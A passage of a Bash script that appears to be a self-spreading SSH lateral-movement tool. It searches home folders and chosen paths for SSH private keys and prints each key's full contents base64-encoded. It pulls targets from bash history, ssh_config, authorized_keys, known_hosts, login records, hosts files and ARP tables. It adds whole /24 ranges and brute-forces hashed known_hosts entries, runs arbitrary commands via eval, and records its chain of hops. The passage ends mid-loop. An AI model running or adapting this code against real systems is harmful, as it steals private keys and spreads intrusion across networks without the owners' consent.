  temp_chain="$hosts_chain"
  recursive_indent_length=0

  while [[ "$temp_chain" == *"$pattern"* ]]; do # XXX: Should we just use grep -c?
    ((recursive_indent_length++))
    temp_chain="${temp_chain#*"$pattern"}" # Cut the temp. chain at the first ]->
  done

  indent="$(printf "%*s" $recursive_indent_length "")"
}

# Print a line beginning with the appropriate indent and hosts_chain, and anything afterwards.
# We use hosts_chain here because it makes more sense to describe the current address.
# Argument $1 is what to print after the chain.
chained_print() {
  printf "%s%s%s\n" "$indent" "$hosts_chain" "$1"
}

# Parse the settings ignored_users, ignored_hosts and ignored_dests, and populate their corresponding internal arrays.
# Quit if this user, host, or destination is ignored, too (how did we get here?)
init_ignored() {
  local ignored_user
  local ignored_host
  local ignored_dest
  local current_ip

  for ignored_user in "${ignored_users[@]}"; do
    is_ssh_user "$ignored_user" && _ignored_users["$ignored_user"]=1
    [[ "$ignored_user" == "$user" ]] && fin
  done

  for ignored_host in "${ignored_hosts[@]}"; do
    is_ssh_host "$ignored_host" && _ignored_hosts["$ignored_host"]=1
    [[ -v 'current_ips["$ignored_host"]' || ${#current_ips["$ignored_host"]} -gt 0 ]] && fin
  done

  for ignored_dest in "${ignored_dests[@]}"; do
    is_ssh_dest "$ignored_dest" && _ignored_dests["$ignored_dest"]=1
    for current_ip in "${!current_ips[@]}"; do
      [[ "$ignored_dest" == "$user@$current_ip" ]] && fin
    done
  done
}

# Load all of the destinations from the ignore_list into the ignore_list_array array.
load_ignore_list_array() {
  local line

  while IFS= read -r line; do
    ignore_list_array["$line"]=1
  done < <(echo "$ignore_list" | tr '|' '\n'  | awk -F'[@:]' -v OFS='@' '
    {
      user = $1
      for (i = 2; i <= NF; i++) {
        if ($i != "" && user != "") {
          print user "@" $i
        }
      }
    }'
  )
}

# Determine whether the current server has already been scanned.
# If it has already been scanned (or is in the process of being scanned), finish.
# Otherwise, add the current destination to the ignore list (even though it has not been scanned yet, but to avoid further destinations scanned from this one going in a circle).
# If ignore_user is set, we check whether the current _host_ (not destination) alone has been scanned.
# Also fill the ignore_list_array array with a list of all the demangled dests from ignore_list.
check_for_recursion() {
  [[ $ignore_user -eq 1 ]] && [[ "$ignore_list" == *"@$current_hostnames_ip$ignore_separator"* ]] && fin

  [[ "$ignore_list" == *"$ignore_separator$user@$current_hostnames_ip$ignore_separator"* ]] && fin

  ignore_list+="$ignore_separator$user@$current_hostnames_ip$ignore_separator"

  load_ignore_list_array

  # In general, if a destination has more than one ip address, the script doesn't really care about the individual addresses for the sake of checking for recursion.
  # However, individual addresses are useful for discovery of dests (from ignore_list_array for example from find_from_ignore_list).
  # Therefore, if $user@$this_host is not present in the demangled list of dests, add it. That is to say, if we've connected to this destination by user@this_host, and this_host is somehow not present on this server, add it.
  # This will also be printed when we fin(), via $current_hosts_ip.
  # XXX: Is this smart to do? Probably not: disabled until further notice.
  #  [[ -v ignore_list_array["$user@$this_host"] || ${#ignore_list_array["$user@$this_host"]} -gt 0 ]] && return
  #  current_hosts_ip="$this_host"
  #  ignore_list+="$ignore_separator$user@$this_host$ignore_separator"
  #  ignore_list_array["$user@$this_host"]=1
}

# Sets up and initializes internal variables and options.
setup() {
  check_startup

  check_sudo
  check_sshkeygen
  check_ssh_options

  init_current_ips
  init_chains

  init_indent

  # Print the normal hosts_chain.
  chained_print ""
  # Print the hostnames_chain.
  printf "%s%s\n" "$indent" "$hostnames_chain"

  init_ignored # We deal with any ignores users, hosts, and dests after printing the destination information because we want to know how we got here, but we don't want to scan.

  check_for_recursion # We check for recursion after printing where we are because we only want to avoid scanning the destination if it's already been fully scanned. We still want to list how we got here.
}

# If we're using use_retry_all_dests, we don't want to scan for any users/hosts/dests on any dests that we have already scanned, we just want to find keys on those destinations.
# Therefore, if using use_retry_all_dests, no-op the addition of hosts/dests/users.
# Then, manually add all interesting_dests values into ssh_dests.
# Since interesting_dests is filled with the demangled destinations (effectively a demangled ignore_list), we check whether each of this destination's $user@$ip is in interesting_dests.
# If all of this destination's $user@$ips are in interesting_dests, we assume we are 'revisiting' this server, so do not perform scanning for users/hosts/dests.
retry_all_dests() {
  local current_ip
  local ssh_dest

  [[ $use_retry_all_dests -eq 2 ]] || return

  for current_ip in "${!current_ips[@]}"; do
    if [[ " ${interesting_dests[*]} " != *" $user@$current_ip "* ]]; then # TODO: remove this loop? turn it into exit?
      return # XXX: Should we report that this is a NEW destination?
    fi
  done

  # no-op
  add_ssh_dest() { :; }
  add_ssh_host() { :; }
  add_ssh_user() { :; }

  for ssh_dest in "${interesting_dests[@]}"; do
    is_ssh_dest "$ssh_dest" && ssh_dests["$ssh_dest"]=1
  done
}

# Execute any custom commands, and print any output.
# XXX: If you want this to execute after the destination has been scanned, move the exec_cusom_cmds call to fin().
exec_custom_cmds() {
  local cmd

  for cmd in "${custom_cmds[@]}"; do
    local output
    output="$(eval "$cmd" 2>&1| base64 | tr -d '\n')"
    chained_print ": EXTERNAL_MSG: CMD[$cmd]: $output"
  done
}

# Creates a list of home folders using both getent passwd(/etc/passwd) (if possible) and listing the directories in /home/ and /Users.
# /home/ may contain deleted users' data still, therefore /etc/passwd is not completely reliable.
find_home_folders() {
  local home_folder

  while IFS= read -r home_folder; do
    [[ -v 'home_folders["$home_folder"]' || ${#home_folders["$home_folder"]} -gt 0 ]] && continue
    home_folder="$(readlink -f -- "$home_folder" 2>/dev/null)"
    is_dir "$home_folder" && home_folders["$home_folder"]=1
  done < <(${s} find -L "/home" "/Users" -mindepth 1 -maxdepth 1 -type d 2>/dev/null)

  while IFS=: read -r _ _ _ _ _ home_folder _; do
    [[ -v 'home_folders["$home_folder"]' || ${#home_folders["$home_folder"]} -gt 0 ]] && continue
    home_folder="$(readlink -f -- "$home_folder" 2>/dev/null)"
    is_dir "$home_folder" && home_folders["$home_folder"]=1
  done < <(getent passwd 2>/dev/null)
}

# Discovers all files in the .ssh/ directories of all home folders.
init_ssh_files() {
  local home_folder

  for home_folder in "${!home_folders[@]}"; do
    local ssh_folder
    local ssh_file

    ssh_folder="$home_folder/.ssh"
    is_dir "$ssh_folder" || continue

    while IFS= read -r ssh_file; do
      is_file "$ssh_file" || continue
      ssh_files["$ssh_file"]=1
    done < <(${s} find -L "$ssh_folder" -type f 2>/dev/null)
  done
}

# Check whether a file is an SSH private key.
check_file_for_privkey() {
  local known_key_headers
  local key_file
  local key_header
  local file_header

  key_file="$1"
  known_key_headers=(
      "SSH PRIVATE KEY FILE FORMAT 1.1"
      "-----BEGIN RSA PRIVATE KEY-----"
      "-----BEGIN DSA PRIVATE KEY-----"
      "-----BEGIN EC PRIVATE KEY-----"
      "-----BEGIN OPENSSH PRIVATE KEY-----"
      "-----BEGIN PRIVATE KEY-----"
      "-----BEGIN ENCRYPTED PRIVATE KEY-----"
      "---- BEGIN SSH2 ENCRYPTED PRIVATE KEY ----"
    )

  is_file "$key_file" || return 1

  read -r -n 50 file_header < <(${s} cat -- "$key_file" 2>/dev/null) # cat is faster than head.
  for key_header in "${known_key_headers[@]}"; do
    if [[ "$file_header" == *"$key_header"* ]]; then
      return 0
    fi
  done

  return 1
}

# Given the location of a potential ssh private key, determine whether we can use the private key for ssh. If so, populate the priv_keys array which contains keys that we will ssh with.
#
# First we attempt to generate a public key for the file using ssh-keygen -yf with an invalid password. If the private key does not have a password, the invalid password does not affect the public-key generation. If the private key does have a passphrase, an error occurs.
# On old ssh-keygen versions, using ssh-keygen -yf on files with too-permissive permissions (regardless of (whether it has a passphrase or not) forces a prompt. By specifying a passphase, this prompt is avoided.
# Therefore, if ssh-keygen -yf fails, we are dealing with any of: 1) a file which is not a private key, 2) a file with invalid permissions, or 3) a private key with a passphrase (or a combination thereof).
# If ssh-keygen -yf's stderr includes "invalid format", the file is not a private key.
#
# If ssh-keygen -yf succeeds, we are dealing with a file which is an unprotected private key file.
#
# There are quite a lot of different failure cases which may be considered, such as (possibly not exhaustive):
# Permission issues on [keyfile], missing [keyfile].pub files (for old versions of ssh-keygen), missing [keyfile].pub files for PEM formatted keys, all protected keys with missing [keyfile].pub (for old ssh-keygen), permission issues on [keyfile] while missing [keyfile].pub and using an extremely old version of ssh-keygen.
# [keyfile] could also not be a valid key at all.
#
# It's all a big mess, which is probably impossible to solve with ssh-keygen itself.
# Therefore, we don't mess around with it and simply use the pubkey as the key for the array of private keys, and the value is the location of the key.
# Also print the key's contents.
populate_keys() {
  local ssh_pubkey
  local ssh_pubkey_ret
  local key_file

  key_file="$1"

  # ssh-keygen -yf attempts to calculate the public key from the private key.
  # Even if there is no passphrase, use -P because old versions of ssh-keygen start an interactive prompt if there are permission errors.
  ssh_pubkey="$(${s} ssh-keygen -P NOT_VALID4SURE -yf "$key_file" 2>&1)"
  ssh_pubkey_ret=$?
  # Ignore the file if it isn't found (race condition?)
  # On new versions of ssh-keygen, an error is produced if the file is not a private key file.
  if [[ "$ssh_pubkey" == *"invalid format"* || "$ssh_pubkey" == *"No such file or directory"* ]]; then
    return 1
  fi

  if [[ $ssh_pubkey_ret -eq 0 ]]; then
    chained_print ": Discovered usable private key in [$key_file]"
    priv_keys["$ssh_pubkey"]="$key_file"
  else
    chained_print ": Discovered unusable private key in [$key_file]"

  fi
  chained_print ": EXTERNAL_MSG: KEY[$key_file]: $(${s} cat -- "$key_file" 2>/dev/null | base64 | tr -d '\n')"
  return 0
}

# Checks whether a file is a key, and if so, attempts to populate the priv_keys array with the location.
# Drops any files which are either user-set to be ignored or ignored for other reasons (such as already searched).
# In all cases, populate the location of files in key_files arrays, so we don't perform this function twice on the same file.
check_and_populate_keys() {
  local unresolved_key_file
  local key_file
  local ignored_key_file

  unresolved_key_file="$1"

  [[ -z "$unresolved_key_file" ]] && return 1

  # Avoid the readlink call if the path is already absolute.
  [[ -v 'priv_keys_files["$unresolved_key_file"]' || ${#priv_keys_files["$unresolved_key_file"]} -gt 0 ]] && return 0
  [[ -v 'key_files["$unresolved_key_file"]' || ${#key_files["$unresolved_key_file"]} -gt 0 ]] && return 1

  key_file="$(${s} readlink -f -- "$unresolved_key_file" 2>/dev/null)" # use sudo because it may be a symlink in a priviliged location, not that it would really matter (ssh will just use the symlink)

  [[ -z "$key_file" ]] && key_files["$unresolved_key_file"]=1 && return 1

  [[ -v 'priv_keys_files["$key_file"]' || ${#priv_keys_files["$key_file"]} -gt 0 ]] && priv_keys_files["$unresolved_key_file"]=1 && return 0
  [[ -v 'key_files["$key_file"]' || ${#key_files["$key_file"]} -gt 0 ]] && key_files["$unresolved_key_file"]=1 && return 1

  key_files["$unresolved_key_file"]=1
  key_files["$key_file"]=1

  for ignored_key_file in "${ignored_key_files[@]}"; do
    [[ "$key_file" == $ignored_key_file ]] && return 1
  done

  if check_file_for_privkey "$key_file"; then
    populate_keys "$key_file" && priv_keys_files["$key_file"]=1 && priv_keys_files["$unresolved_key_file"]=1 && return 0
  fi

  return 1
}

# Attempts to discover any ssh private keys in the home folder .ssh/ files which have previously been discovered.
find_ssh_keys() {
  local ssh_file

  for ssh_file in "${!ssh_files[@]}"; do
    check_and_populate_keys "$ssh_file"
  done
}

# Attempts to discover any ssh private keys in the user set $scan_paths paths.
find_ssh_keys_paths() {
  local ssh_file

  while IFS= read -r ssh_file; do
    check_and_populate_keys "$ssh_file"
  done < <(${s} find -L ${scan_paths[@]} -maxdepth "$scan_paths_depth" -type f -size +200c -size -14000c -exec grep -l -m 1 -E '^----[-| ]BEGIN .{0,15}PRIVATE KEY' {} + 2>/dev/null) # Longest key is ---- BEGIN SSH2 ENCRYPTED PRIVATE KEY ----. We lose "SSH PRIVATE KEY FILE FORMAT 1.1" but oh well.
}

# Given a key file path and a home directory, determine whether the key exists and corresponds to a private key or not using the appropriate home directory location where necessary.
# This converts ~/ and relative paths to their appropriate locations based on the home_folder location.
check_potential_key_files() {
  local key_file
  local home_folder
  local potential_key_file

  key_file="$1"
  home_folder="$2"

  for potential_key_file in "$key_file" "$home_folder/${key_file:1}" "$home_folder/$key_file"; do
    check_and_populate_keys "$potential_key_file" && return 0
  done

  return 1
}

# Attempts to find users, hosts, destinations, and private keys from bash history files.
# Due to the multitude of arguments that ssh may take, we parse each bash_history file and then tokenize the line.
# In reality, we look for any calls to ssh, scp, and rsync, and parse the tokens appropriately. This is extremely difficult as we're emulating execve's job with unreliable, arbitrary data.
#
# In all cases, we attempt to parse the standard user@host.
#
# In the case of scp and ssh:
#
# We discover private keys by matching the "-i" flag in the form of "-i file" or "-ifile".
# The -i flag is used in various ways: -i /home/user/.ssh/id_rsa, -i ~/.ssh/id_rsa, or -i .ssh/id_rsa.
# In the first case, we can simply check whether the key exists and is a key, and populate our list of keys: check_and_populate_keys /home/user/.ssh/id_rsa.
# In the second case, we replace the ~ character with the home directory for which we are parsing the bash_history file: check_and_populate_keys $home_directory/.ssh/id_rsa.
# In the last case, we prepend the home directory for which we are parsing the bash_history file: check_and_populate_keys $home_directory/.ssh/id_rsa.
#
# In the case of ssh:
#
# The -l flag can be used to specify the username of the remote destination. For example, ssh host -l root, or ssh host -lroot.
# We parse both cases, and add them to ssh_users. For the life-time of the bash history LINE, we also save the username.
#
# In the case of both scp and ssh, we are generally parsing lines which may or may not include usernames, hosts, destinations, keys, arguments, and commands to run on the remote server.
# This complicates things slightly, as the following:
# ssh -v -i .ssh/id_rsa -l user host 'ps auxf'
# needs to be parsed very carefully.
# We also need to ensure we don't parse too much of the line to include commands that are passed to the ssh session (e.g. ssh -luser host 'ps')
# Therefore, for each line that is parsed, we also cache the username and host that is parsed (if possible). If a username and host are parsed, we stop processing the line (unless the `-i` flag is detected but the key has not been retrieved yet).
# If no username is parsed for the whole line, we guess the username is that of the user whose home directory we are looking at.
find_from_bash_history() {
  local home_folder

  for home_folder in "${!home_folders[@]}"; do
    local home_file
    local bash_history_line
    local home_user

    home_file="$home_folder/.bash_history"
    is_file "$home_file" || continue

    home_user="$(basename -- "$home_folder" 2>/dev/null)"

    while IFS= read -r bash_history_line; do
      local ssh_dest
      local tokens
      local i
      local cached_ssh_user
      local cached_ssh_host
      local cached_ssh_key

      cached_ssh_user=""
      cached_ssh_host=""
      cached_ssh_key=""

      # ssh user@host ; extract user@host
      # scp file user@host:~/ ; extract user@host
      # scp user@host:~/file ./ ; extract user@host
      # rsync -a * user@host:~/ ; extract user@host
      if ssh_dest="$(echo "$bash_history_line" | grep -m 1 -oE "$allowed_users_chars"'@[^ :]+')"; then # TODO: doesn't work when matches multiple (-3).
        local ssh_host
        local ssh_user

        ssh_host="${ssh_dest#*@}"
        ssh_user="${ssh_dest%%@*}"

        add_ssh_dest "$ssh_dest" && cached_ssh_user="$ssh_user" && cached_ssh_host="$ssh_host"

      # scp file host:~/ ; extract host
      # scp host:~/file ./ ; extract host
      elif [[ "$bash_history_line" == "scp "* ]]; then
        local ssh_host

        ssh_host="$(echo "$bash_history_line" | grep -m 1 -o -E '[^ ]+:')"
        ssh_host="${ssh_host%:}"

        add_ssh_dest "$home_user@$ssh_host" && cached_ssh_user="$home_user" && cached_ssh_host="$ssh_host"
      fi

      [[ "$bash_history_line" == "rsync "* ]] && continue

      read -ra tokens < <(printf "%s" "$bash_history_line")
      for ((i=0; i<${#tokens[@]}; i++)); do
        local token

        # Break if we've already determined a host and username, and there is no more information to gather.
        [[ -n "$cached_ssh_user" && -n "$cached_ssh_host" ]] && [[ "$bash_history_line" != *" -i"* || -n "$cached_ssh_key" ]] && break
        [[ -n "$cached_ssh_host" && -z "$cached_ssh_user" && "$bash_history_line" != *" -l"* ]] && [[ "$bash_history_line" != *" -i"* || -n "$cached_ssh_key" ]] && break

        token="${tokens[$i]}"

        [[ "$token" == "ssh" ]] && continue
        [[ "$token" == "scp" ]] && continue

        # ssh -i.ssh/id_rsa host ; extract .ssh/id_rsa
        # ssh -i .ssh/id_rsa host ; extract .ssh/id_rsa
        if [[ "$token" == "-i"* ]]; then
          local key_file

          if [[ ${#token} -gt 2 ]]; then
            key_file="${token:2}"
          elif [[ $((i+1)) -lt ${#tokens[@]} ]]; then
            key_file="${tokens[$i+1]}"
          else
            continue
          fi
          # Depending on the line, it could be an absolute path, ~/ expansion, or relative like .ssh/id_rsa.
          check_potential_key_files "$key_file" "$home_folder" && cached_ssh_key="$key_file"
        # ssh -luser host ; extract user
        # ssh -l user host ; extract user
        elif [[ "$token" == "-l"* ]]; then
          local ssh_user

          if [[ ${#token} -gt 2 ]]; then
            ssh_user="${token:2}"
          elif [[ $((i+1)) -lt ${#tokens[@]} ]]; then
            ssh_host="${tokens[$i+1]}"
          else
            continue
          fi
          [[ -z "$cached_ssh_user" ]] && add_ssh_user "$ssh_user" && cached_ssh_user="$ssh_user"
        else
          [[ "$token" == "-"* ]] && continue
          # Should always be true since we continue on token = [ssh|scp|rsync]
          [[ $i -gt 0 ]] || continue
          local prev_token
          local prev_prev_token

          # match on the PREVIOUS token.
          prev_token="${tokens[$i-1]}"
          [[ $i -gt 1 ]] && prev_prev_token="${tokens[$i-2]}"
          [[ "$bash_history_line" == "ssh "* ]] || continue
          if [[ "$prev_token" == "-"* ]]; then
            # ssh -v host ; extract host
            # ssh -p22 host ; extract host
            # ssh -vv host ; extract host
            # ssh -oOption=yes host ; extract host
            # ssh -i file host -luser ps ; do NOT extract 'ps' (cached_ssh_host already set)
            # ssh host -v 'bash -c ls' ; do NOT extract 'bash (cached_ssh_host already set).
            if [[ "$prev_token" =~ ^-[46AaCfGgKkMNnqsTtVvXxYy]*$ || ${#prev_token} -gt 2 ]]; then
              local ssh_host

              ssh_host="$token"
              [[ -z "$cached_ssh_host" ]] && add_ssh_host "$ssh_host" && cached_ssh_host="$ssh_host"
            fi
          # ssh host ; extract host.
          # ssh -v host ; do NOT extract -v.
          elif [[ "$prev_token" == "ssh" ]]; then
            local ssh_host
            local ssh_user

            ssh_host="$token"
            [[ -z "$cached_ssh_host" ]] && add_ssh_host "$ssh_host" && cached_ssh_host="$ssh_host"
          # ssh -i key host ; extract host
          # ssh -vv -o Option=yes host ; extract host
          # ssh -v host 'ps' ; do NOT extract anything. (especially 'ps')
          # ssh -v -p22 host 'ps' ; do NOT extract anything (especially 'ps')
          # ssh -D 9000 localhost -luser ; extract host
          # ssh -i file -v -luser host ps ; do NOT extract 'ps' (cached_ssh_host already set)
          elif [[ $i -gt 1 && "$prev_prev_token" == "-"* ]] && [[ ! "$prev_prev_token" =~ ^-[46AaCfGgKkMNnqsTtVvXxYy]*$ && ! ${#prev_prev_token} -gt 2 ]]; then
            local ssh_host

            ssh_host="$token"
            [[ -z "$cached_ssh_host" ]] && add_ssh_host "$ssh_host" && cached_ssh_host="$ssh_host"
          # ssh -l user host ps ; break on ps.
          # ssh host command ; break on command.
          # ssh -i /file/ -l user host cmd ; break on cmd.
          elif [[ $i -gt 1 && "${prev_prev_token:0:1}" != "-" && "${prev_token:0:1}" != "-" ]]; then
            break
          else
            # Shouldn't be necessary, but can get rid of trailing commands, complicated cases (sigh).
            break
          fi
        fi
      done
      [[ -z "$cached_ssh_user" ]] && add_ssh_user "$home_user" && cached_ssh_user="$home_user" # XXX: Can we parse ssh_config and detect Host [host] corresponds to a user, instead?

      [[ -n "$cached_ssh_user" && -n "$cached_ssh_host" ]] && add_ssh_dest "$cached_ssh_user@$cached_ssh_host"
    done < <(${s} grep -E '^(ssh|scp|rsync) ' -- "$home_file" 2>/dev/null | sort | uniq)
  done
}

# Attempt to find usernames, hosts, and key files from ssh_config files.
# An example of an ssh_config file:
# Host example.com
#   Hostname example.com
#   User your_username
#   IdentityFile ~/.ssh/id_rsa
#
# We parse both Host and Hostname (since Hostname is optional).
# We also deal with IdentityFile when it begins with a ~ or a relative path.
#
# Unfortunately, we don't create ssh_dests based on the results because we parse the file line-by-line. We could probably make this work properly if we reset the variable when there's an empty line.
find_from_ssh_config() {
  local home_folder

  for home_folder in "${!home_folders[@]}"; do
    local ssh_file
    local home_user

    is_dir "$home_folder/.ssh" || continue

    home_user="$(basename -- "$home_folder" 2>/dev/null)"

    while IFS= read -r ssh_file; do
      is_file "$ssh_file" || continue

      local cline

      while IFS= read -r cline; do
        local cline_val
        local cline_key

        cline_val="$(echo "$cline" | awk '{print $NF}')" # Might be tab or space
        cline_key="$(echo "$cline" | awk '{print $1}')" # Might be tab or space
        cline_key="${cline_key,,}"

        [[ -z "$cline_val" ]] && continue
        [[ -z "$cline_key" ]] && continue

        case "$cline_key" in
          "host")
            add_ssh_host "$cline_val"
            [[ -n "$home_user" ]] && add_ssh_dest "$home_user@$cline_val"
            ;;
          "hostname")
            add_ssh_host "$cline_val"
            [[ -n "$home_user" ]] && add_ssh_dest "$home_user@$cline_val"
            ;;
          "user")
            add_ssh_user "$cline_val"
            ;;
          "identityfile")
            check_potential_key_files "$cline_val" "$home_folder"
            ;;
        esac
      done < <(${s} grep -iE 'Host|HostName|User|IdentityFile' -- "$ssh_file" 2>/dev/null | sort | uniq)
    done < <(${s} find -L "$home_folder/.ssh" -type f 2>/dev/null)
  done
}

# A small hacky way to retrieve the username which corresponds to a file in a home directory.
find_user_from_file() {
  local home_folder

  for home_folder in "${!home_folders[@]}"; do
    if [[ "$1" == "$home_folder"* ]]; then
      basename -- "$home_folder"
      return
    fi
  done
}

# authorized_keys may contain restrictions such as from="host,host2". Extract that host.
# If the file comes from a home directory, also extract the username and turn it into a destination.
find_from_authorized_keys() {
  local ssh_file

  for ssh_file in "${!ssh_files[@]}"; do
    local ssh_address
    local home_user

    [[ -z "$ssh_file" ]] && continue

    home_user="$(find_user_from_file "$ssh_file")"

    while IFS= read -r ssh_address; do
      local ssh_host

      [[ -z "$ssh_address" ]] && continue
      while IFS= read -r ssh_host; do
        add_ssh_host "$ssh_host"
        [[ -n "$home_user" ]] && add_ssh_dest "$home_user@$ssh_host"
      done < <(echo "$ssh_address" | awk -F"\\\'|\\\"" '{print $2}' | tr ',' '\n' | sort | uniq)
    done < <(${s} grep -F 'from=' -- "$ssh_file" 2>/dev/null | awk -F"\\\'|\\\"" '{print $2}' | tr ',' '\n' | sort | uniq)
  done
}

# Find any hosts that have previously ssh'd into this dest. Guess that the username they're sshing to here is the same as where they're coming from (naively).
find_from_last() {
  local ssh_dest

  last -aiw >/dev/null 2>&1 || return

  while IFS= read -r ssh_dest; do
    add_ssh_dest "$ssh_dest"
  done < <(last -aiw 2>/dev/null | grep -v reboot | awk '/\./ {print $1":"$NF}' | sort | uniq)

}

# known_hosts contains a list of hosts that have previously been connected to.
# On some systems, the host values are not hashed, and we can extract them.
# An example looks like:
# 2048 MD5:32:41:b4:e7:3e:d7:ee:a4:3a:c3:a8:44:40:45:16:04 192.168.1.1 (RSA)
#
# Incidentally, this will also scan authorized_keys files, which may look like this:
# 2048 MD5:62:38:9a:f0:6d:e7:57:57:25:09:71:4d:c7:bb:4b:b0 root@server (RSA)
# Thus we can also add root@server to our list of destinations.
find_from_known_hosts() {
  local ssh_file

  for ssh_file in "${!ssh_files[@]}"; do
    local known_host_line
    local home_user

    home_user="$(find_user_from_file "$ssh_file")"

    while IFS= read -r known_host_line; do
      local ssh_host
      local ssh_user
      local ssh_dest

      [[ -z "$known_host_line" ]] && continue

      ssh_user="$(echo "$known_host_line" | grep -F -m 1 '@' | awk -F"@" '{print $1}')"
      ssh_host="$(echo "$known_host_line" | grep -F -m 1 -v '@')"
      ssh_dest="$(echo "$known_host_line" | grep -m 1 -oE "$allowed_users_chars"'@[^ :]+')"

      add_ssh_user "$ssh_user"
      add_ssh_host "$ssh_host"
      add_ssh_dest "$ssh_dest"

      [[ -n "$home_user" && -n "$ssh_host" ]] && add_ssh_dest "$home_user@$ssh_host"
    done < <(${s} "${sshkeygen[@]}" "$ssh_file" 2>/dev/null | grep -F -v '|1|' | tr '[:upper:]' '[:lower:]' | grep -oE ':[a-z0-9]{2} .*' | awk '{print $2}' | sort | uniq)
  done
}

# /etc/hosts and other static hosts may be interesting.
find_from_hosts() {
  local ssh_host

  while IFS= read -r ssh_host; do
    add_ssh_host "$ssh_host"
  done < <(getent ahostsv4 2>/dev/null | awk -F"  " '{print $NF}' | tr ' ' '\n' | sort | uniq) # skip ipv6 for now, might be tab.

  while IFS=": " read -r _ ssh_host; do
    add_ssh_host "$ssh_host"
  done < <(dscacheutil -q host 2>/dev/null | grep -F 'ip_address:' | sort | uniq)
}

# Neighbouring hosts that announce themselves via ARP may be interesting.
find_arp_neighbours() {
  local ssh_host

  while IFS= read -r ssh_host; do
    add_ssh_host "$ssh_host"
  done < <(ip neigh 2>/dev/null | awk '$1 !~ /(\.1$|:)/ {print $1}' | sort | uniq) # ignore ipv6 and ignore gateway

  while IFS= read -r ssh_host; do
    add_ssh_host "$ssh_host"
  done < <(arp -a 2>/dev/null | awk -F"\\\(|\\\)" '{print $2}' | awk '$1 !~ /(\.1$|:)/ {print $1}' | sort | uniq) # ignore ipv6 and ignore gateway
}

# Neighbouring d-block hosts (x.x.x.0-x.x.x.255) may be interesting.
find_d_block() {
  local octets
  local i
  local current_ip

  for current_ip in "${!current_ips[@]}"; do
    IFS='.' read -ra octets < <(echo "$current_ip")

    # Might be an unknown ip address.
    [[ ${#octets[@]} -eq 4 ]] || continue

    for ((i=0; i<256; i++)); do
      add_ssh_host "${octets[0]}.${octets[1]}.${octets[2]}.$i"
    done
  done
}

# It may be interesting to attempt to SSH back to the same destination that we initially connected from.
# We determine where we came from using the chain and parsing the second-last entry (the last one being THIS host).
# We also add $SSH_CONNECTIONS and $this_dest, which if it differs, mean we're being forwarded somewhere else (so, check all).
find_from_prev_dest() {
  local chain_sl_dest
  local ssh_user
  local ssh_host

  chain_sl_dest="${hosts_chain%[*}"
  chain_sl_dest="${chain_sl_dest##*->}"

  add_ssh_dest "$chain_sl_dest"

  add_ssh_dest "$this_dest"

  [[ -z "$SSH_CONNECTION" ]] && return

  ssh_host="${SSH_CONNECTION%% *}"
  add_ssh_host "$ssh_host"
}

# Read the ignore list and load destinations from the ignore list (aka which have already been connected to from some other host) into ssh_dests.
find_from_ignore_list() {
  local ssh_dest

  for ssh_dest in "${!ignore_list_array[@]}"; do
    add_ssh_dest "$ssh_dest"
  done
}

# By default, most Debian-based OS' use ssh_config's HashKnownHosts, which hashes the hosts that are SSH'd to.
# For example, using `ssh 192.168.1.1`, known_hosts will list `|1|+iwCSCtqbUdZJgeteQqYgQ0hWG8=|a3AyqEIKC7R4uDQsAv8zI1yIGpU=` as the hostname.
# We can attempt to crack these hashes by using ssh-keygen -F, which provided a host, will print if it is in the known_hosts file.
# Since we need to actually know the hosts in order to test them, we can try brute-forcing c and d-blocks of the local ip address.
# For example, if we are 10.5.3.2, we can search for 10.5.0.0-10.5.255.255.
# We also add the $user@$host to destinations, where $user is the home folder corresponding to where the known_hosts file was found.
#
# If xargs is not available, we fall back to manually checking the range in a double for loop.
#
# This is EXTREMELY slow, and even slower when using sudo. Here are some benchmarks:
# xargs: 2m42.820s
# for-loop: 7m52.145s
# sudo xargs: 3m56.659s
# sudo for-loop: 15m36.738s
#
# Therefore, this should be used only in extreme cases.
find_from_hashed_known_hosts() {
  local octets
  local ssh_file
  local current_ip

  for ssh_file in "${!ssh_files[@]}"; do
    local hashed_number
    local home_user
    local ssh_host
    local i
    local j
    local ss

    [[ -z "$ssh_file" ]] && continue

    ss=""
    # Don't use sudo unless we have to.
    [[ ! -r "$ssh_file" ]] && ss="$s"

    home_user="$(find_user_from_file "$ssh_file")"

    # Determine how many (if any) hashed known hosts are in the file.
    hashed_number="$(${ss} "${sshkeygen[@]}" "$ssh_file" 2>/dev/null | grep -Ec ':[a-zA-Z0-9]{2} \|1\|')"

    # break if there are no hashed known hosts left
    [[ $hashed_number -lt 1 ]] && continue

    # Check all of the current ssh_hosts against all of the hashed known hosts.
    # ssh_hosts includes all ssh_dests already, so no need to parse ssh_dests.
    for ssh_host in "${!ssh_hosts[@]}"; do
      local found_hosts_count

      found_hosts_count=0

      # break if there are no hashed known hosts left.
      [[ $hashed_number -lt 1 ]] && break

      found_hosts_count="$(${ss} "${sshkeygen[@]}" "$ssh_file" -F "$ssh_host" 2>/dev/null | grep -cE 'Host .* found')" && ((hashed_number -= found_hosts_count)) && [[ -n "$home_user" ]] && add_ssh_dest "$home_user@$ssh_host"
    done

    # break if there are no hashed known hosts left.
    [[ $hashed_number -lt 1 ]] && continue

    # Check all of the ignore_list hosts against all of the hashed known hosts.
    for ssh_dest in "${!ignore_list_array[@]}"; do
      local found_hosts_count

      found_hosts_count=0

      # break if there are no hashed known hosts left.

      [[ $hashed_number -lt 1 ]] && break

      ssh_host="${ssh_dest#*@}"
      found_hosts_count="$(${ss} "${sshkeygen[@]}" "$ssh_file" -F "$ssh_host" 2>/dev/null | grep -cE 'Host .* found')" && ((hashed_number -= found_hosts_count)) && [[ -n "$home_user" ]] && add_ssh_dest "$home_user@$ssh_host"
    done

    # break if there are no hashed known hosts left.
    [[ $hashed_number -lt 1 ]] && continue

    # Finally, start brute forcing.

    # use xargs if possible
    for current_ip in "${!current_ips[@]}"; do
      # break if there are no hashed known hosts left.
      [[ $hashed_number -lt 1 ]] && break

      IFS='.' read -ra octets < <(echo "$current_ip")
      [[ ${#octets[@]} -eq 4 ]] || continue

      if command -v xargs >/dev/null 2>&1; then
        for i in {0..255}; do
          # break if there are no hashed known hosts left.
          [[ $hashed_number -lt 1 ]] && break
          while IFS= read -r ssh_host; do
            ssh_host="${ssh_host#*Host }"
            ssh_host="${ssh_host%% found*}"
            add_ssh_host "$ssh_host"
            ((hashed_number--))
            [[ -n "$home_user" ]] && add_ssh_dest "$home_user@$ssh_host"
          done < <(
            for j in {0..255}; do
              echo "${octets[0]}.${octets[1]}.$j.$i"
            done | xargs -P 0 -n 1 ${ss} ssh-keygen -f "$ssh_file" -F 2>/dev/null | grep -F '# Host')
        done
      else
        for ((i=0; i<256; i++)); do
